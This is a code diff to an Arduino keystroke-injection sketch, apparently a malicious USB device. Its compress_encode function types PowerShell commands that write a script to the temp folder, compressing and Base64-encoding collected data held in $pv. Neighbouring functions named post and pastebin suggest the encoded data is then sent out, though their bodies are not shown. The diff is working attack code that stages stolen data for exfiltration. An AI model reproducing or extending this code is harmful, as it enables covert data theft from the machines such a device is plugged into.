@@ -28,30 +28,27 @@ void post(String filename)
 
 void compress_encode(String filename)
 {
-    Keyboard.print("echo $r = [string]::Join(\"`n\", $pv) >> %temp%\\\");
-    Keyboard.print(filename);
-    Keyboard.println(".ps1");
-    Keyboard.print("echo $ms = New-Object IO.MemoryStream >> %temp%\\\");
-    Keyboard.print(filename);
-    Keyboard.println(".ps1");
-    Keyboard.print("echo $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress) >> %temp%\\\");
-    Keyboard.print(filename);
-    Keyboard.println(".ps1");
-    Keyboard.print("echo $sw = New-Object System.IO.StreamWriter($cs) >> %temp%\\\");
-    Keyboard.print(filename);
-    Keyboard.println(".ps1");
-    Keyboard.print("echo $sw.Write($r) >> %temp%\\\");
-    Keyboard.print(filename);
-    Keyboard.println(".ps1");
-    Keyboard.print("echo $sw.Close() >> %temp%\\\");
-    Keyboard.print(filename);
-    Keyboard.println(".ps1");
-    Keyboard.print("echo $code = [Convert]::ToBase64String($ms.ToArray()) >> %temp%\\\");
-    Keyboard.print(filename);
-    Keyboard.println(".ps1");
-    Keyboard.print("echo $code >> %temp%\\\");
-    Keyboard.print(filename);
-    Keyboard.println(".ps1");
+ Keyboard.print("echo $ms = New-Object IO.MemoryStream >> %temp%\\\");
+ Keyboard.print(filename);
+ Keyboard.println(".ps1");
+ Keyboard.print("echo $ac = [IO.Compression.CompressionMode]::Compress >> %temp%\\\");
+ Keyboard.print(filename);
+ Keyboard.println(".ps1");
+ Keyboard.print("echo $cs = New-Object IO.Compression.DeflateStream ($ms,$ac) >> %temp%\\\");
+ Keyboard.print(filename);
+ Keyboard.println(".ps1");
+ Keyboard.print("echo $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII) >> %temp%\\\");
+ Keyboard.print(filename);
+ Keyboard.println(".ps1");
+ Keyboard.print("echo $pv ^| ForEach-Object {$sw.WriteLine($_)} >> %temp%\\\");
+ Keyboard.print(filename);
+ Keyboard.println(".ps1");
+ Keyboard.print("echo $sw.Close() >> %temp%\\\");
+ Keyboard.print(filename);
+ Keyboard.println(".ps1");
+ Keyboard.print("echo $code = [Convert]::ToBase64String($ms.ToArray()) >> %temp%\\\");
+ Keyboard.print(filename);
+ Keyboard.println(".ps1");
 }
 
 void pastebin(String filename)
